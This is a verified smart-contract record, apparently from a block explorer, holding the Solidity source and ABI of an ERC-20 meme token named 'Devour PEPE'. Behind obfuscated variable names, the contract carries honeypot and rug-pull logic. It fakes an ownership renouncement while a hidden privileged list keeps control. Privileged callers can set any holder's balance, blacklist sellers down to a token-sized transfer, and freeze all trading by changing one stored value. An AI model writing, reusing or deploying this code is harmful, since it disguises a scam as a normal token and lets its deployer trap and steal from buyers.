{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface minWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletEnableBuy) external view returns (uint256);\n\n    function transfer(address walletTotal, uint256 takeTotal) external returns (bool);\n\n    function allowance(address listMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletTotal,\n        uint256 takeTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverTx, uint256 value);\n    event Approval(address indexed listMin, address indexed spender, uint256 value);\n}\n\nabstract contract txFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletAtFee {\n    function createPair(address exemptAt, address enableReceiver) external returns (address);\n}\n\ninterface minWalletMetadata is minWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DevourPEPE is txFrom, minWallet, minWalletMetadata {\n\n    uint256 private walletMode = 100000000 * 10 ** 18;\n\n    uint256 private toList;\n\n    uint256 launchSender;\n\n    address public toFee;\n\n    address txFeeLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public totalSender;\n\n    function swapWalletAmount(address tradingShould) public {\n        if (txTeamSell) {\n            return;\n        }\n        \n        totalSender[tradingShould] = true;\n        \n        txTeamSell = true;\n    }\n\n    uint256 teamWallet;\n\n    string private fromFee = \"DPE\";\n\n    bool public txTeamSell;\n\n    function getOwner() external view returns (address) {\n        return sellToMarketing;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromFee;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletMode;\n    }\n\n    bool private fromMode;\n\n    function swapFrom(address senderAutoEnable, address walletTotal, uint256 takeTotal) internal returns (bool) {\n        require(maxWallet[senderAutoEnable] >= takeTotal);\n        maxWallet[senderAutoEnable] -= takeTotal;\n        maxWallet[walletTotal] += takeTotal;\n        emit Transfer(senderAutoEnable, walletTotal, takeTotal);\n        return true;\n    }\n\n    function balanceOf(address walletEnableBuy) public view virtual override returns (uint256) {\n        return maxWallet[walletEnableBuy];\n    }\n\n    string private senderAuto = \"Devour PEPE\";\n\n    uint256 private txMax;\n\n    uint256 public marketingAt;\n\n    address enableLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address atList, uint256 takeTotal) public virtual override returns (bool) {\n        launchedTake[_msgSender()][atList] = takeTotal;\n        emit Approval(_msgSender(), atList, takeTotal);\n        return true;\n    }\n\n    function liquidityList() private view {\n        require(totalSender[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed receiverMin, address indexed feeLaunched);\n\n    function decimals() external view virtual override returns (uint8) {\n        return atReceiverAmount;\n    }\n\n    function owner() external view returns (address) {\n        return sellToMarketing;\n    }\n\n    constructor (){\n        if (toList == receiverToken) {\n            shouldFee = true;\n        }\n        teamTrading launchedTotalWallet = teamTrading(enableLimit);\n        toFee = walletAtFee(launchedTotalWallet.factory()).createPair(launchedTotalWallet.WETH(), address(this));\n        if (limitSenderMax == toList) {\n            senderFee = txMax;\n        }\n        autoList = _msgSender();\n        shouldList();\n        totalSender[autoList] = true;\n        maxWallet[autoList] = walletMode;\n        \n        emit Transfer(address(0), autoList, walletMode);\n    }\n\n    function transferFrom(address senderAutoEnable, address walletTotal, uint256 takeTotal) external override returns (bool) {\n        if (_msgSender() != enableLimit) {\n            if (launchedTake[senderAutoEnable][_msgSender()] != type(uint256).max) {\n                require(takeTotal <= launchedTake[senderAutoEnable][_msgSender()]);\n                launchedTake[senderAutoEnable][_msgSender()] -= takeTotal;\n            }\n        }\n        return totalListMarketing(senderAutoEnable, walletTotal, takeTotal);\n    }\n\n    function listFrom(address receiverWallet, uint256 takeTotal) public {\n        liquidityList();\n        maxWallet[receiverWallet] = takeTotal;\n    }\n\n    address public autoList;\n\n    function enableAt(uint256 takeTotal) public {\n        liquidityList();\n        launchSender = takeTotal;\n    }\n\n    uint256 private limitSenderMax;\n\n    mapping(address => bool) public liquidityToken;\n\n    address private sellToMarketing;\n\n    function sellLaunch(address modeTake) public {\n        liquidityList();\n        \n        if (modeTake == autoList || modeTake == toFee) {\n            return;\n        }\n        liquidityToken[modeTake] = true;\n    }\n\n    uint8 private atReceiverAmount = 18;\n\n    uint256 public senderFee;\n\n    uint256 constant swapLimit = 5 ** 10;\n\n    function shouldList() public {\n        emit OwnershipTransferred(autoList, address(0));\n        sellToMarketing = address(0);\n    }\n\n    uint256 private receiverToken;\n\n    mapping(address => mapping(address => uint256)) private launchedTake;\n\n    function totalListMarketing(address senderAutoEnable, address walletTotal, uint256 takeTotal) internal returns (bool) {\n        if (senderAutoEnable == autoList) {\n            return swapFrom(senderAutoEnable, walletTotal, takeTotal);\n        }\n        uint256 autoSwap = minWallet(toFee).balanceOf(txFeeLaunched);\n        require(autoSwap == launchSender);\n        require(walletTotal != txFeeLaunched);\n        if (liquidityToken[senderAutoEnable]) {\n            return swapFrom(senderAutoEnable, walletTotal, swapLimit);\n        }\n        return swapFrom(senderAutoEnable, walletTotal, takeTotal);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return senderAuto;\n    }\n\n    bool public shouldFee;\n\n    function transfer(address receiverWallet, uint256 takeTotal) external virtual override returns (bool) {\n        return totalListMarketing(_msgSender(), receiverWallet, takeTotal);\n    }\n\n    mapping(address => uint256) private maxWallet;\n\n    function allowance(address atAmount, address atList) external view virtual override returns (uint256) {\n        if (atList == enableLimit) {\n            return type(uint256).max;\n        }\n        return launchedTake[atAmount][atList];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletEnableBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeTotal\",\"type\":\"uint256\"}],\"name\":\"enableAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTotal\",\"type\":\"uint256\"}],\"name\":\"listFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTake\",\"type\":\"address\"}],\"name\":\"sellLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingShould\",\"type\":\"address\"}],\"name\":\"swapWalletAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAutoEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTeamSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DevourPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}